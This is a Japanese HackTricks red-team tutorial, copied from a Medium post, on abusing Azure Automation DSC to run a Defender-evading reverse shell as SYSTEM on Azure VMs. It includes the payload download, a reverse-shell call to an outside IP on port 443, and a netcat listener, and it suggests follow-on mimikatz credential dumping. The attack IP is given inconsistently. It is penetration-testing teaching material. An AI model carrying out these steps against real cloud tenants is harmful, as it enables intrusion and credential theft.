# Az - State Configuration RCE

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

**この投稿は** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe) **からコピーされました**

### リモートサーバー（C2）インフラの準備 <a href="#f0fa" id="f0fa"></a>

リモートサーバー「40.84.7.74」、つまりKaliボックスから、NishangのInvoke-PowerShellTcp.ps1ペイロードの簡略版をホストします。ペイロード名は「RevPS.ps1」です。NishangスクリプトがWindows Defenderによって何らかの理由で削除されないように（ファイルをディスクにドロップしたいかもしれません）、Defenderを回避することができる軽量バージョンがこちらにあります：[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1)。これはKaliボックス上のシンプルなPython Simple Serverによってホストされます。

### ステップ1 — ファイルの作成 <a href="#89de" id="89de"></a>

別のDSC構成ファイルを作成する必要があります。テンプレートはこちらからダウンロードできます：[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1)。この構成ファイルは、以前使用した同じファイル書き込み機能を使用します。今回は、リモートサーバーからペイロードをダウンロードして実行するコードが含まれています。また、_ComputerManagementDsc_ モジュールから利用可能なスケジュールタスク機能を使用しています。スケジュールタスク機能は、後で実行とSYSTEM権限の取得において重要な役割を果たします。

VMに構成を公開するために使用されるスクリプトもダウンロードします。こちらにあります：[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1)。

これらのファイルはテンプレートとして機能します。**使用している変数名やパラメータを記入する必要があります**。これには、リソース名、ファイルパス、使用している外部サーバー/ペイロード名が含まれます。コード内のコメントを参照してください。

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

### ステップ2 — 構成ファイルの圧縮 <a href="#c2c2" id="c2c2"></a>

2つのファイルを作成したら、**「reverse\_shell\_config.ps1」** ファイルをzip圧縮して、ストレージアカウントに送信できるようにします。
```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
### ステップ 3 — ストレージコンテキストの設定とアップロード <a href="#bed9" id="bed9"></a>

再度、私のストレージアカウントのコンテキストを設定します。これは既に完了しています。私はすでに '**azure-pentest**' という名前のコンテナを持っているので、ここに公開します：
```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
### ステップ 4 — Kali Box の準備 <a href="#20fb" id="20fb"></a>

Kali box では、PowerShell ペイロードを _wget_ で簡単に取得できます。生のリバースシェルスクリプトはこちらにあります: [https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1)。
```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
```markdown
<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

リバースシェルスクリプトを編集し、実行された際にWindows VMが接続先を知るために、私たちのパラメータを追加する必要があります。私の場合、以下を追加しました：
```
```
RevPShell -Reverse 40.84.7.73 443
```
### ステップ 5 — 設定ファイルの公開 <a href="#9ad6" id="9ad6"></a>

次に、設定ファイルを実行します。私はデスクトップに公開するように設定していますが、視覚的にわかりやすいためです。しかし、ほぼどこにでも公開することができます。数分後、リバースシェルスクリプトが公開されたことがわかります！

### ステップ 6 — ペイロードのホストとリスナーの設定 <a href="#c55f" id="c55f"></a>

設定を公開したら、ペイロードをホストするためにポート80でPython SimpleHTTPServerを同時に開始し、接続をキャッチするためにnetcatリスナーを設定します。
```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```
スケジュールされたタスクが実行され、ペイロードが取得され、**SYSTEM** レベルの権限でメモリ内で実行されたことが確認できます！

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### まとめ <a href="#1ec2" id="1ec2"></a>

これで多くの可能性が開かれました。**SYSTEM** としてシェルを実行しているので、mimikatzを使ってクレデンシャルをダンプすることができます（クラウドリソースのEDRの成熟度によってはリスクがあるかもしれません）。クレデンシャルをダンプすると、これらを異なるリソース間で再利用できる可能性が高くなります。最後に、重要なポイントは、これを1つのVMに限定するのではなく、複数のVMにこの設定を適用する可能性があるということです。

このノートで、Azure Automation DSCの冒険は終わりです！楽しんで、多くを学び、自分の創造性でさらに拡張していくことを願っています。

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
